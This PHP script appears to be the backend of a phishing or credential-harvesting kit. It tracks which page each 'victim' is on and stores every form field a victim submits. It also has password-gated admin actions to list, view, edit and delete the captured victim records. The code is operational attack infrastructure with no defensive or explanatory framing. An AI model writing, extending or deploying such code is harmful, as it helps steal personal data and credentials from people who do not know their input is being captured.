<?php
require_once('functions.php');

if(empty($_GET['action']))
{
    return;
}

$action = $_GET['action'];


if($action == "heartbeat")
{
    echo $victim->heartbeat($_SESSION['ent_id'], $_GET['currentpage']);
}
else if($action == "send_data")
{
    $victim_id = isset($_SESSION['ent_id']) ? $_SESSION['ent_id'] : 0;
    echo $victim->victim_data($victim_id, $_POST['currentpage'], $_POST);
}

if(!empty($_SESSION['admin_pass']) && $_SESSION['admin_pass'] == ADMIN_PASS)
{
    if($action == "victim")
    {
        if(empty($_GET['id']))
        {
            return;
        }
        header('Content-type: application/json');
    
        echo json_encode($admin->getVictim($_GET['id']));
    }
    else if($action == "victims")
    {
        header('Content-type: application/json');
        echo json_encode($admin->getAllVictims());
    }
    else if($action == "update_data")
    {
        if(empty($_POST['ent_id']))
        {
            return;
        }
    
        echo $admin->updateVictim($_POST['ent_id'], $_POST);
    }
    else if($action == "entity_delete")
    {
        if(empty($_POST['ent_id']))
        {
            return;
        }
    
        $admin->deleteVictim($_POST['ent_id']);
    }
}


?>